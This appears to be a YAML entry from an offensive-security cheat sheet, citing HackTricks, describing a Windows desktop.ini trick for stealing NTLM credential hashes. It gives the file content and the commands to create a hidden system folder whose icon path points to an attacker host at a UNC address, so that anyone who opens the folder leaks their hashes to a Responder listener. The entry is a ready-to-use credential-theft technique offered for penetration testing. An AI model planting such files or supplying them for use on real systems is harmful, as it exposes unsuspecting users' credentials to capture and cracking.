---
description: |
  The desktop.ini files contain the information of the icons you have applied to the folder. We can abuse this to resolve a network path. Once you open the folder you should get the hashes. Make sure you have Responder running on the attacker IP address.

  Command Reference:
  ```
  Attacker IP: 10.10.14.4
  ```
command: |
  [.ShellClassInfo]
  IconFile=\\10.10.14.4\maus

code: |
  mkdir openMe
  attrib +s openMe
  cd openMe
  echo [.ShellClassInfo] > desktop.ini
  echo IconResource=\\192.168.0.1\aa >> desktop.ini
  attrib +s +h desktop.ini

items:
  - Shell
  - No_creds
services:
  -
OS:
  - Windows
attack_types:
  - Persistence
  - PrivEsc
references:
  - https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini
---